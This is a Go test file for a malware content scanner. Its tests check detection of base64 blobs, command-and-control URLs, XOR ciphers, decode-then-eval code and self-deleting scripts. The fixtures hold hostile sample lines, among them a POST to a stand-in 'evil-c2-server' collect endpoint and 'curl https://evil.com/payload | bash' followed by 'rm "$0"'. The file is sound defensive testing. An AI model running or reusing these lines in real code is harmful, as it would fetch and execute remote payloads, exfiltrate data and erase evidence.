package scanner

import (
	"encoding/base64"
	"strings"
	"testing"
)

// Threshold regression tests ensure that detection changes don't cause
// false positives on legitimate code patterns.

func TestBase64_SingleLargeBlobDetected(t *testing.T) {
	cs := NewContentScanner()
	// Large base64 blob that decodes successfully (should be caught by new lower threshold)
	raw := strings.Repeat("malicious payload data here.", 10) // 280 bytes
	encoded := base64.StdEncoding.EncodeToString([]byte(raw))
	content := `var data = "` + encoded + `";`

	patterns := cs.detectSuspiciousPatterns(content)
	found := false
	for _, p := range patterns {
		if strings.Contains(p, "base64") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("Single large base64 blob (%d chars) should be detected; patterns: %v", len(encoded), patterns)
	}
}

func TestBase64_SmallBlobsStillDetected(t *testing.T) {
	cs := NewContentScanner()
	// Multiple small base64 blobs (existing behavior, >5 matches)
	raw := strings.Repeat("data", 15) // 60 bytes → ~80 base64 chars each
	encoded := base64.StdEncoding.EncodeToString([]byte(raw))
	content := ""
	for i := 0; i < 6; i++ {
		content += `var chunk` + string(rune('a'+i)) + ` = "` + encoded + `";` + "\n"
	}

	patterns := cs.detectSuspiciousPatterns(content)
	found := false
	for _, p := range patterns {
		if strings.Contains(p, "base64") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("Multiple base64 blobs (6 occurrences) should still be detected; patterns: %v", patterns)
	}
}

func TestNetworkIndicator_SingleC2URL(t *testing.T) {
	cs := NewContentScanner()
	// Single C2 URL should now be caught (not just >5 URLs)
	content := `fetch("https://evil-c2-server.com/collect", { method: "POST" });`
	indicators := cs.detectNetworkIndicators(content)
	found := false
	for _, ind := range indicators {
		if strings.Contains(ind, "evil-c2-server") || strings.Contains(ind, "Non-whitelisted") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("Single non-whitelisted URL should be flagged; indicators: %v", indicators)
	}
}

func TestNetworkIndicator_LegitCDN_NoFalsePositive(t *testing.T) {
	cs := NewContentScanner()
	// CDN URLs should NOT be flagged
	content := `
const script = document.createElement('script');
script.src = 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js';
const fonts = 'https://fonts.googleapis.com/css2?family=Inter';
const pkg = 'https://registry.npmjs.org/express';
const raw = 'https://raw.githubusercontent.com/user/repo/main/readme.md';
`
	indicators := cs.detectNetworkIndicators(content)
	for _, ind := range indicators {
		if strings.Contains(ind, "Non-whitelisted") {
			t.Errorf("Legitimate CDN/registry URLs should NOT be flagged; got: %s", ind)
		}
	}
}

func TestNetworkIndicator_SuspiciousTLD(t *testing.T) {
	cs := NewContentScanner()
	content := `fetch("https://checkmarx.zone/api/collect")`
	indicators := cs.detectNetworkIndicators(content)
	foundTLD := false
	for _, ind := range indicators {
		if strings.Contains(ind, ".zone") {
			foundTLD = true
			break
		}
	}
	if !foundTLD {
		t.Errorf(".zone TLD should be flagged as suspicious; indicators: %v", indicators)
	}
}

func TestCustomCipher_SimpleXOR(t *testing.T) {
	cs := NewContentScanner()
	content := `
for (let i = 0; i < data.length; i++) {
    result[i] = data.charCodeAt(i) ^ key.charCodeAt(i % key.length);
}
`
	threats := cs.detectCustomCiphers(content)
	if len(threats) == 0 {
		t.Error("charCodeAt XOR pattern should be detected")
	}
}

func TestCustomCipher_PythonXOR(t *testing.T) {
	cs := NewContentScanner()
	content := `
decoded = bytes([ord(c) ^ key[i % len(key)] for i, c in enumerate(encoded)])
`
	threats := cs.detectCustomCiphers(content)
	if len(threats) == 0 {
		t.Error("Python ord() XOR pattern should be detected")
	}
}

func TestCompoundBehavior_Base64PlusExec(t *testing.T) {
	cs := NewContentScanner()
	content := `
const decoded = atob(encoded_payload);
eval(decoded);
`
	threats := cs.detectCompoundBehaviors(content)
	if len(threats) == 0 {
		t.Error("base64 decode + eval compound should be detected")
	}
}

func TestCompoundBehavior_LegitCode_NoFalsePositive(t *testing.T) {
	cs := NewContentScanner()
	// Legitimate code that uses fetch but no dangerous combos
	content := `
const response = await fetch('/api/users');
const data = await response.json();
console.log(data);
`
	threats := cs.detectCompoundBehaviors(content)
	if len(threats) > 0 {
		t.Errorf("Simple fetch call should NOT trigger compound behavior; got: %s", threats[0].Description)
	}
}

func TestAntiForensics_PythonSelfDelete(t *testing.T) {
	cs := NewContentScanner()
	content := `
import os
# Clean up after execution
os.remove(__file__)
`
	threats := cs.detectAntiForensics(content)
	if len(threats) == 0 {
		t.Error("Python os.remove(__file__) should be detected as anti-forensics")
	}
}

func TestAntiForensics_ShellSelfDelete(t *testing.T) {
	cs := NewContentScanner()
	content := `
#!/bin/bash
curl https://evil.com/payload | bash
rm "$0"
`
	threats := cs.detectAntiForensics(content)
	if len(threats) == 0 {
		t.Error("Shell rm $0 should be detected as anti-forensics")
	}
}
